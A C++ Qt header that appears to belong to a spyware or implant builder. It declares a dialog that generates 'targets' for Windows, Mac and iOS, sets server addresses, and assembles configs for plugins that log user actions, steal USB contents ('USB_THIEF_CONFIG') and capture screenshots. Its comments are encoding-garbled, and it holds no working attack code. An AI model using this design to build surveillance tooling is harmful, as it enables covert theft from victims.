/*!
	Description : ����Ŀ���
	Author		: Ruining Song
	Date		: 2013.12.5
	Remark		:
			
			��Ҫ���� : ���������ļ������
*/

#ifndef GENERATEDLG_H
#define GENERATEDLG_H

#include <QtGui>
#include "ui_generatedlg.h"
#include <windows.h>

#include "target.h"

#include "include/T5UserAction.h"
#include "include/T5UsbConfig.h"
#include "include/T5Screen.h"

#include "waitdlg.h"

typedef struct _PLUGIN_ALIAS
{
	DWORD dwPluginNumber;			// 1��2��3��4
	WCHAR wzPluginName[MAX_PATH];	// XXX.dat
}PLUGIN_ALIAS, *PPLUGIN_ALIAS;

class GenerateThread;
class WaitDlg;

class GenerateDlg : public QDialog
{
	Q_OBJECT

public:

	enum PLATFORM{SYSTEM_WINDOWS=0, SYSTEM_MAC, SYSTEM_IOS, };

	GenerateDlg(QWidget *parent = 0);
	~GenerateDlg();

private slots:

	// ����Ŀ��
	void GenerateTarget();

	// ƽ̨�仯
	void PlatformChanged(QListWidgetItem* item);

	// ����Ŀ�����
	void GenerateFinished();

	// ����/ip ���л�
	void ServerTypeChanged_1(int index);
	void ServerTypeChanged_2(int index);

	// ��������
	void GetIP();

	// Ŀ���Ƿ��ѱ� root ( android device )
	void RootStatusChanged();

	// �����仯 local/remote
	void EnvironmentChanged();

private:

	void InitCustomGui();

	// ���� dtl.dat
	bool GenerateMainCfg();

	// ���� glp.uin
	bool GeneratePlgCfg();

	// ���� plugin.dat
	bool GeneratePlgNameCfg();

	// ��ȡ�û���Ϊ������Ϣ
	bool GetUserActionCfgInfo(PUSER_ACT_CFG& lpUserActCfgData);

	// ��ȡ usb ������Ϣ
	bool GetUsbCfgInfo(PUSB_THIEF_CONFIG& lpUsbThiefCfgData);

	// ��ȡ����������Ϣ
	bool GetScreenshotCfgInfo(PCAPTURE_CONFIG& lpCaptureCfgData);

	// ��ȡָ��ϵͳ��Ӧ�� PlgCxtVect
	PPLUGIN_CXT* GetPlgCxtVect();

	// Simple factory, return generate thread.
	GenerateThread* CreateGenerateThread(std::wstring path);

	void UpdatePluginEnabled();

	inline const bool* GetPluginEnabledLayout()
	{
		return m_plgEnabled;
	}

private:
	Ui::GenerateDlg ui;
	std::wstring m_curSystem;

	QWidget* tab2;
	GenerateThread* m_genThread;
	WaitDlg* m_waitDlg;
	QValidator* m_ipMask;

	// ���õĲ��
	bool m_plgEnabled[MAX_PLG_COUNT];
};

#endif // GENERATEDLG_H
